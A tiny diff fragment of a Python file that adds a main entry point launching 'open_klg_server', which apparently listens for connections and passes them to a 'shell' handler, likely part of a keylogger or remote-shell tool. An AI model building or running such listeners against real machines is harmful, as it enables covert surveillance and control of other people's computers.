@@ -22,3 +22,7 @@ def shell(client: socket.socket, ip: str):
 def open_klg_server():
     client, ip = server.open_server((config.IP, config.KLG_PORT))
     shell(client, ip)
+
+
+if __name__ == "__main__":
+    open_klg_server()
